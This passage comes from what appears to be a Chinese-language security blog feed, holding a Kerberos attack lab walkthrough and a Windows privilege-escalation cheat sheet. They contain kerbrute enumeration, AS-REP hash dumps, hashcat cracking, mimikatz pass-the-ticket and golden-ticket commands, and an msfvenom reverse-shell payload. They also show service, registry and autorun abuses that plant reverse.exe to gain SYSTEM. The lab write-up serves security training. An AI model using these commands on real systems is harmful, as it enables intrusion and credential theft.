class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/thm/dc]</span><br><span class="line">└─<span class="comment"># ./kerbrute_linux_amd64 userenum -d controller.local --dc 10.10.79.10 User.txt</span></span><br><span class="line"></span><br><span class="line">    __             __               __     </span><br><span class="line">   / /_____  _____/ /_  _______  __/ /____ </span><br><span class="line">  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \</span><br><span class="line"> / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/</span><br><span class="line">/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        </span><br><span class="line"></span><br><span class="line">Version: v1.0.3 (9dad6e1) - 05/31/22 - Ronnie Flathers @ropnop</span><br><span class="line"></span><br><span class="line">2022/05/31 14:42:12 &gt;  Using KDC(s):</span><br><span class="line">2022/05/31 14:42:12 &gt;  10.10.79.10:88</span><br><span class="line"></span><br><span class="line">2022/05/31 14:42:12 &gt;  [+] VALID USERNAME: admin1@controller.local</span><br><span class="line">2022/05/31 14:42:12 &gt;  [+] VALID USERNAME: administrator@controller.local</span><br><span class="line">2022/05/31 14:42:12 &gt;  [+] VALID USERNAME: admin2@controller.local</span><br><span class="line">2022/05/31 14:42:14 &gt;  [+] VALID USERNAME: httpservice@controller.local</span><br><span class="line">2022/05/31 14:42:14 &gt;  [+] VALID USERNAME: user1@controller.local</span><br><span class="line">2022/05/31 14:42:14 &gt;  [+] VALID USERNAME: sqlservice@controller.local</span><br><span class="line">2022/05/31 14:42:14 &gt;  [+] VALID USERNAME: machine1@controller.local</span><br><span class="line">2022/05/31 14:42:14 &gt;  [+] VALID USERNAME: machine2@controller.local</span><br><span class="line">2022/05/31 14:42:14 &gt;  [+] VALID USERNAME: user3@controller.local</span><br><span class="line">2022/05/31 14:42:14 &gt;  [+] VALID USERNAME: user2@controller.local</span><br><span class="line">2022/05/31 14:42:14 &gt;  Done! Tested 100 usernames (10 valid) <span class="keyword">in</span> 2.335 seconds</span><br><span class="line">                                                                                                                   </span><br><span class="line">┌──(root㉿kali)-[~/thm/dc]</span><br><span class="line">└─<span class="comment"># impacket-GetNPUsers controller.local/ -dc-ip 10.10.79.10 -usersfile users.txt</span></span><br><span class="line">Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[-] User admin1 doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User administrator doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">$krb5asrep$23<span class="variable">$admin2</span>@CONTROLLER.LOCAL:07a875b10ff834c5a2aea53d367d88e0<span class="variable">$d867b1bb964665668d8405a90ccf69099c615ffd2611be6c53ffde1fa918b55a5bd4f8078d20124cc2b88e14939e76f7cb20f36e1dc26282b03b5455ba979ca8b5a8680b585bee525a28746ef61bf096706addfdd47fcbd434d55581a2492522cd6884b48e6c1342abd67a62f0f1d8121ba9a559a4827550603699a7d408e2ff74521208f153bbd77b80d54dd71909e650f6898180f38eac5ed0013bd1c86baa70c5acb0567873d10a7270cb03b65c4fb03f12dddf76e3db5f1cc330d126017725b9571c02e87c1b30b6457ab390d47e73ed1838ec0a34345de43fd9a604f0d4cf2930b50d2717cbd54d13040c6e35c6828190d8</span></span><br><span class="line">[-] User httpservice doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User user1 doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">[-] User sqlservice doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">[-] User machine1 doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line">[-] User machine2 doesn<span class="string">&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span></span><br><span class="line"><span class="string">$krb5asrep$23$user3@CONTROLLER.LOCAL:e6bed73be459842186ce695e7080075b$0d9f7c02066d7255f0ffae252d29b4738af12e3f914559fc67e3b4b6fa52afdc5904c5b769c58afed62caa2e714b64748194a50e6b38ae47f2d3f03faf6bd50570d0d382885cc59a98fd4b3844fb557b37c98855e7b3d0423faa4683341bc06eba64f0e5df2fc2b506987225b885ccf06ca94801273b355f1af2c001b151f73a2d8eae8470d7699d20c12b8f7e9b0410de278189f3bfb905a3626c3be77f803f69e5885f7e91a0564f4f5c7a15789bb32b7aec1df7705ba84cf4066df79d007be9c91da6b0fc001553a68b0f2f4a7f01e22211ea171ee80a44469f661fdda4422e6fe99b6a72316395c874c316b1c731c05f6c63</span></span><br><span class="line"><span class="string">[-] User user2 doesn&#x27;</span>t have UF_DONT_REQUIRE_PREAUTH <span class="built_in">set</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="Hashcat-破解hash"><a href="#Hashcat-破解hash" class="headerlink" title="Hashcat 破解hash"></a>Hashcat 破解hash</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m <span class="number">18200</span> hash.txt <span class="regexp">/usr/</span>share<span class="regexp">/wordlists/</span>rockyou.txt </span><br></pre></td></tr></table></figure><h2 id="6使用-mimikatz-传递票据"><a href="#6使用-mimikatz-传递票据" class="headerlink" title="#6使用 mimikatz 传递票据"></a>#6使用 mimikatz 传递票据</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Downloads&gt;mimikatz.exe</span><br><span class="line"></span><br><span class="line">mimikatz # privilege::<span class="builtin-name">debug</span> </span><br><span class="line">Privilege <span class="string">&#x27;20&#x27;</span> OK </span><br><span class="line"></span><br><span class="line">mimikatz # sekurlsa::tickets /<span class="builtin-name">export</span> </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>导出kirbi文件在mimikatz同级目录下</p><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/3154a0edb7581424e8ab64130f8c288b.png" alt="image-20220531163144243"></p><p>导入票据</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos<span class="number">::</span>ptt &lt;ticket&gt;</span><br><span class="line">kerberos<span class="number">::</span>ptt [<span class="number">0;48506</span>]-<span class="number">2</span>-<span class="number">0-40e10000</span>-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi</span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/779d67e721c744fb9731b6a5ef0e188c.png" alt="image-20220531164744121"></p><h2 id="7-mimikatz-金-银票攻击"><a href="#7-mimikatz-金-银票攻击" class="headerlink" title="#7 mimikatz 金/银票攻击"></a>#7 mimikatz 金/银票攻击</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mimikatz</span>.exe</span><br><span class="line"><span class="attribute">privilege</span>::debug</span><br><span class="line"><span class="attribute">Kerberos</span>::golden /user:Administrator /domain:controller.local /sid:S-<span class="number">1</span>-<span class="number">5</span>-<span class="number">21</span>-<span class="number">432953485</span>-<span class="number">3795405108</span>-<span class="number">1502158860</span> /krbtgt:<span class="number">72</span>cd<span class="number">714611</span>b<span class="number">64</span>cd<span class="number">4</span>d<span class="number">5550</span>cd<span class="number">2759</span>db<span class="number">3</span>f<span class="number">6</span> /id:<span class="number">502</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Attacking-Kerberos&quot;&gt;&lt;a href=&quot;#Attacking-Kerberos&quot; class=&quot;headerlink&quot; title=&quot;Attacking Kerberos&quot;&gt;&lt;/a&gt;&lt;strong&gt;Attacking Kerberos&lt;/stro</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Windows privesc</title>
    <link href="https://z4ynadmin.github.io/2022/11/07/Windows-privesc/"/>
    <id>https://z4ynadmin.github.io/2022/11/07/Windows-privesc/</id>
    <published>2022-11-07T07:27:37.000Z</published>
    <updated>2022-11-07T07:45:36.250Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0-信息收集"><a href="#0-信息收集" class="headerlink" title="#0 信息收集"></a>#0 信息收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用户信息收集</span></span><br><span class="line">当前用户的权限：whoami /priv</span><br><span class="line">列出用户：net users</span><br><span class="line">列出用户的详细信息：net user username（e.g. net user Administrator）</span><br><span class="line">其他用户同时登录：qwinsta（与query session命令相同）</span><br><span class="line">系统上定义的用户组：net localgroup</span><br><span class="line">列出特定组的成员：net localgroup groupname（e.g. net localgroup Administrators）</span><br><span class="line"></span><br><span class="line"><span class="comment"># 系统信息收集</span></span><br><span class="line">systeminfo</span><br><span class="line">systeminfo | findstr /B /C:<span class="string">&quot;OS Name&quot;</span> /C:<span class="string">&quot;OS Version&quot;</span></span><br><span class="line">hostname</span><br><span class="line"></span><br><span class="line"><span class="comment"># 补丁详细情况</span></span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜索文件</span></span><br><span class="line">findstr /si password *.txt</span><br><span class="line">命令分解：</span><br><span class="line">findstr：搜索文件中的文本模式。</span><br><span class="line">/si：搜索当前目录和所有子目录（s），忽略大写/小写差异（i）</span><br><span class="line">password：该命令将在文件中搜索字符串“密码”</span><br><span class="line">*.txt：搜索将涵盖具有 .txt 扩展名的文件</span><br><span class="line">可以根据您的需要和目标环境更改字符串和文件扩展名，但“.txt”、“.xml”、“.ini”、“*.config”和“.xls”通常是一个好地方开始。</span><br><span class="line"></span><br><span class="line"><span class="comment"># 网络连接</span></span><br><span class="line">netstat -ano</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计划任务</span></span><br><span class="line">schtasks：该命令可用于查询计划任务。</span><br><span class="line">schtasks /query /fo LIST /v</span><br><span class="line"></span><br><span class="line"><span class="comment"># 驱动程序</span></span><br><span class="line">driverquery</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看杀毒软件状态</span></span><br><span class="line">sc query windefend</span><br></pre></td></tr></table></figure><h3 id="1-Tools"><a href="#1-Tools" class="headerlink" title="#1 Tools"></a>#1 Tools</h3><p>WinPEAS：<a href="https://github.com/carlospolop/PEASS-ng">https://github.com/carlospolop/PEASS-ng</a></p><p>PowerUp：<a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 反向shell</span></span><br><span class="line">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f exe -o reverse.exe</span><br></pre></td></tr></table></figure><h3 id="2-服务漏洞"><a href="#2-服务漏洞" class="headerlink" title="#2 服务漏洞"></a>#2 服务漏洞</h3><p>) 1 - 不安全的服务权限</p><p>accesschk.exe：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk</a></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">accesschk.exe -uwcqv &quot;Users&quot; *#跟下面命令相同</span><br><span class="line"><span class="function">C:\<span class="title">PrivEsc</span>\<span class="title">accesschk.exe</span> /<span class="title">accepteula</span> -<span class="title">uwcqv</span> <span class="title">user</span> *  #<span class="title">daclsvc</span>服务<span class="title">user</span>用户拥有更改服务配置权限(<span class="title">SERVICE_CHANGE_CONFIG</span>)</span></span><br><span class="line"><span class="function"><span class="title">sc</span> <span class="title">qc</span> <span class="title">daclsvc</span>#查询服务并注意它以 <span class="title">SYSTEM</span> 权限 (<span class="title">SERVICE_START_NAME</span>) 运行</span></span><br><span class="line"><span class="function"><span class="title">sc</span> <span class="title">config</span> <span class="title">daclsvc</span> <span class="title">binpath</span>= &quot;\&quot;<span class="title">C</span>:\<span class="title">PrivEsc</span>\<span class="title">reverse.exe</span>\&quot;&quot;#修改服务配置并将 <span class="title">BINARY_PATH_NAME</span> (<span class="title">binpath</span>) 设置为反向<span class="title">shell</span></span></span><br><span class="line"><span class="function"><span class="title">net</span> <span class="title">start</span> <span class="title">daclsvc</span>#在 <span class="title">Kali</span> 上启动一个侦听器，然后启动该服务以生成一个以 <span class="title">SYSTEM</span> 权限运行的反向 <span class="title">shell</span></span></span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/18e6999b565eedec7fb1a6b2f5d4cac5.png" alt="image-20220525152423849"></p><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/9ec64c21e9788fd47b791f7090696368.png" alt="image-20220525142216546"></p><p>) 2 - 未引用的服务路径</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">Unquoted</span> <span class="title">Path</span> <span class="title">Service</span>&gt;<span class="title">sc</span> <span class="title">qc</span> <span class="title">unquotedsvc</span>#查询“ <span class="title">unquotedsvc</span>” 服务，注意它以 <span class="title">SYSTEM</span> 权限 (<span class="title">SERVICE_START_NAME</span>) 运行，并且 <span class="title">BINARY_PATH_NAME</span> 未引用并包含空格</span></span><br><span class="line"><span class="function">[<span class="title">SC</span>] <span class="title">QueryServiceConfig</span> <span class="title">SUCCESS</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">SERVICE_NAME</span>: <span class="title">unquotedsvc</span></span></span><br><span class="line"><span class="function">        <span class="title">TYPE</span>               : 10  <span class="title">WIN32_OWN_PROCESS</span></span></span><br><span class="line"><span class="function">        <span class="title">START_TYPE</span>         : 3   <span class="title">DEMAND_START</span></span></span><br><span class="line"><span class="function">        <span class="title">ERROR_CONTROL</span>      : 1   <span class="title">NORMAL</span></span></span><br><span class="line"><span class="function">        <span class="title">BINARY_PATH_NAME</span>   : <span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">Unquoted</span> <span class="title">Path</span> <span class="title">Service</span>\<span class="title">Common</span> <span class="title">Files</span>\<span class="title">unquotedpathservice.exe</span></span></span><br><span class="line"><span class="function">        <span class="title">LOAD_ORDER_GROUP</span>   :</span></span><br><span class="line"><span class="function">        <span class="title">TAG</span>                : 0</span></span><br><span class="line"><span class="function">        <span class="title">DISPLAY_NAME</span>       : <span class="title">Unquoted</span> <span class="title">Path</span> <span class="title">Service</span></span></span><br><span class="line"><span class="function">        <span class="title">DEPENDENCIES</span>       :</span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_START_NAME</span> : <span class="title">LocalSystem</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">Unquoted</span> <span class="title">Path</span> <span class="title">Service</span>&gt;<span class="title">C</span>:\<span class="title">PrivEsc</span>\<span class="title">accesschk.exe</span> /<span class="title">accepteula</span> -<span class="title">uwdq</span> &quot;<span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">Unquoted</span> <span class="title">Path</span> <span class="title">Service</span>\&quot;#使用 <span class="title">accesschk.exe</span>，注意 <span class="title">BUILTIN</span>\<span class="title">Users</span> 组允许写入 <span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">Unquoted</span> <span class="title">Path</span> <span class="title">Service</span>\ 目录</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">Unquoted</span> <span class="title">Path</span> <span class="title">Service</span></span></span><br><span class="line"><span class="function">  <span class="title">Medium</span> <span class="title">Mandatory</span> <span class="title">Level</span> (<span class="title">Default</span>) [<span class="title">No</span>-<span class="title">Write</span>-<span class="title">Up</span>]</span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">BUILTIN</span>\<span class="title">Users</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">NT</span> <span class="title">SERVICE</span>\<span class="title">TrustedInstaller</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">SYSTEM</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">BUILTIN</span>\<span class="title">Administrators</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">Unquoted</span> <span class="title">Path</span> <span class="title">Service</span>&gt;<span class="title">copy</span> <span class="title">C</span>:\<span class="title">PrivEsc</span>\<span class="title">reverse.exe</span> &quot;<span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">Unquoted</span> <span class="title">Path</span> <span class="title">Service</span>\<span class="title">Common.exe</span>&quot;#您创建的 <span class="title">reverse.exe</span> 可执行文件复制到此目录并将其重命名为 <span class="title">Common.exe</span></span></span><br><span class="line"><span class="function">        1 <span class="title">file</span>(<span class="title">s</span>) <span class="title">copied</span>.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">Unquoted</span> <span class="title">Path</span> <span class="title">Service</span>&gt;<span class="title">net</span> <span class="title">start</span> <span class="title">unquotedsvc</span>#在 <span class="title">Kali</span> 上启动一个侦听器，然后启动该服务以生成一个以 <span class="title">SYSTEM</span> 权限运行的反向 <span class="title">shell</span></span></span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/3fa41de4e02b651ab6472babe9289531.png" alt="image-20220525152457510"></p><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/38dee7976244eabac32b962460dd7433.png" alt="image-20220525154120916"></p><p>) 3 - 不安全的注册表服务</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">c:\<span class="title">PrivEsc</span>&gt;<span class="title">sc</span> <span class="title">qc</span> <span class="title">regsvc</span># 查询“ <span class="title">regsvc</span>” 服务</span></span><br><span class="line"><span class="function">[<span class="title">SC</span>] <span class="title">QueryServiceConfig</span> <span class="title">SUCCESS</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">SERVICE_NAME</span>: <span class="title">regsvc</span></span></span><br><span class="line"><span class="function">        <span class="title">TYPE</span>               : 10  <span class="title">WIN32_OWN_PROCESS</span></span></span><br><span class="line"><span class="function">        <span class="title">START_TYPE</span>         : 3   <span class="title">DEMAND_START</span></span></span><br><span class="line"><span class="function">        <span class="title">ERROR_CONTROL</span>      : 1   <span class="title">NORMAL</span></span></span><br><span class="line"><span class="function">        <span class="title">BINARY_PATH_NAME</span>   : &quot;<span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">Insecure</span> <span class="title">Registry</span> <span class="title">Service</span>\<span class="title">insecureregistryservice.exe</span>&quot;</span></span><br><span class="line"><span class="function">        <span class="title">LOAD_ORDER_GROUP</span>   :</span></span><br><span class="line"><span class="function">        <span class="title">TAG</span>                : 0</span></span><br><span class="line"><span class="function">        <span class="title">DISPLAY_NAME</span>       : <span class="title">Insecure</span> <span class="title">Registry</span> <span class="title">Service</span></span></span><br><span class="line"><span class="function">        <span class="title">DEPENDENCIES</span>       :</span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_START_NAME</span> : <span class="title">LocalSystem</span># 注意它以 <span class="title">SYSTEM</span> 权限 (<span class="title">SERVICE_START_NAME</span>) 运行</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">c</span>:\<span class="title">PrivEsc</span>&gt;<span class="title">C</span>:\<span class="title">PrivEsc</span>\<span class="title">accesschk.exe</span> /<span class="title">accepteula</span> -<span class="title">uvwqk</span> <span class="title">HKLM</span>\<span class="title">System</span>\<span class="title">CurrentControlSet</span>\<span class="title">Services</span>\<span class="title">regsvc</span></span></span><br><span class="line"><span class="function"><span class="title">HKLM</span>\<span class="title">System</span>\<span class="title">CurrentControlSet</span>\<span class="title">Services</span>\<span class="title">regsvc</span># 使用 <span class="title">accesschk.exe</span>(注意修改对应服务名称)</span></span><br><span class="line"><span class="function">  <span class="title">Medium</span> <span class="title">Mandatory</span> <span class="title">Level</span> (<span class="title">Default</span>) [<span class="title">No</span>-<span class="title">Write</span>-<span class="title">Up</span>]</span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">SYSTEM</span></span></span><br><span class="line"><span class="function">        <span class="title">KEY_ALL_ACCESS</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">BUILTIN</span>\<span class="title">Administrators</span></span></span><br><span class="line"><span class="function">        <span class="title">KEY_ALL_ACCESS</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">INTERACTIVE</span>#请注意 <span class="title">regsvc</span> 服务的注册表项可由“<span class="title">NT</span>  <span class="title">AUTHORITY</span>\<span class="title">INTERACTIVE</span>”组（基本上所有登录用户）写入</span></span><br><span class="line"><span class="function">        <span class="title">KEY_ALL_ACCESS</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">c</span>:\<span class="title">PrivEsc</span>&gt;<span class="title">reg</span> <span class="title">add</span> <span class="title">HKLM</span>\<span class="title">SYSTEM</span>\<span class="title">CurrentControlSet</span>\<span class="title">services</span>\<span class="title">regsvc</span> /<span class="title">v</span> <span class="title">ImagePath</span> /<span class="title">t</span> <span class="title">REG_EXPAND_SZ</span> /<span class="title">d</span> <span class="title">C</span>:\<span class="title">PrivEsc</span>\<span class="title">reverse.exe</span> /<span class="title">f</span></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">operation</span> <span class="title">completed</span> <span class="title">successfully</span>.</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">c</span>:\<span class="title">PrivEsc</span>&gt;<span class="title">net</span> <span class="title">start</span> <span class="title">regsvc</span></span></span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/39fc57f8b8573a03ccec233bdf8d2508.png" alt="image-20220525161239852"></p><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/ab3f8349b152183e2539681d696b96e4.png" alt="image-20220525160834061"></p><p>) 4 - 不安全的服务可执行文件</p><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/52fea3bae7978fd98b73f0e2dbc58208.png" alt="image-20220525172553728"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 查询“ filepermsvc” 服务</span><br><span class="line">sc qc filepermsvc</span><br><span class="line"></span><br><span class="line"># 使用 accesschk.exe，请注意服务二进制文件 (BINARY_PATH_NAME) 文件对所有人都是可写的</span><br><span class="line"><span class="function">C:\<span class="title">PrivEsc</span>\<span class="title">accesschk.exe</span> /<span class="title">accepteula</span> -<span class="title">quvw</span> &quot;<span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">File</span> <span class="title">Permissions</span> <span class="title">Service</span>\<span class="title">filepermservice.exe</span>&quot;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">#复制您创建的 <span class="title">reverse.exe</span> 可执行文件并用它替换 <span class="title">filepermservice.exe</span></span></span><br><span class="line"><span class="function"><span class="title">copy</span> <span class="title">C</span>:\<span class="title">PrivEsc</span>\<span class="title">reverse.exe</span> &quot;<span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">File</span> <span class="title">Permissions</span> <span class="title">Service</span>\<span class="title">filepermservice.exe</span>&quot; /<span class="title">Y</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">#在 <span class="title">Kali</span> 上启动一个侦听器，然后启动该服务以生成一个以 <span class="title">SYSTEM</span> 权限运行的反向 <span class="title">shell</span></span></span><br><span class="line"><span class="function"><span class="title">net</span> <span class="title">start</span> <span class="title">filepermsvc</span></span></span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/47171d740657bddbecb10891e9ccb724.png" alt="image-20220525170550784"></p><h3 id="3-注册表"><a href="#3-注册表" class="headerlink" title="#3 注册表"></a>#3 注册表</h3><p>AutoRuns</p><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/4013f1d706346cb30c0572dc764146ba.png" alt="image-20220525172120597"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 在注册表中查询 AutoRun 可执行文件：</span><br><span class="line">reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line"></span><br><span class="line"># 使用 accesschk.exe，请注意其中一个 AutoRun 可执行文件对每个人都是可写的：</span><br><span class="line"><span class="function">C:\<span class="title">PrivEsc</span>\<span class="title">accesschk.exe</span> /<span class="title">accepteula</span> -<span class="title">wvu</span> &quot;<span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">Autorun</span> <span class="title">Program</span>\<span class="title">program.exe</span>&quot;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">#复制您创建的 <span class="title">reverse.exe</span> 可执行文件 并用它覆盖 <span class="title">AutoRun</span> 可执行文件：</span></span><br><span class="line"><span class="function"><span class="title">copy</span> <span class="title">C</span>:\<span class="title">PrivEsc</span>\<span class="title">reverse.exe</span> &quot;<span class="title">C</span>:\<span class="title">Program</span> <span class="title">Files</span>\<span class="title">Autorun</span> <span class="title">Program</span>\<span class="title">program.exe</span>&quot; /<span class="title">Y</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 在现实世界中，您必须等待管理员自己登录！</span></span><br></pre></td></tr></table></figure><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/63181b75ba68f796efa8a6b2515bf785.png" alt="image-20220525172846079"></p><p>AlwaysInstallElevated</p><p><img src="https://z4admin.s3.ap-northeast-1.amazonaws.com//images/2022/11/8ad5f98a706e1a198f8772eeca3dcc79.png" alt="image-20220525175002143"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 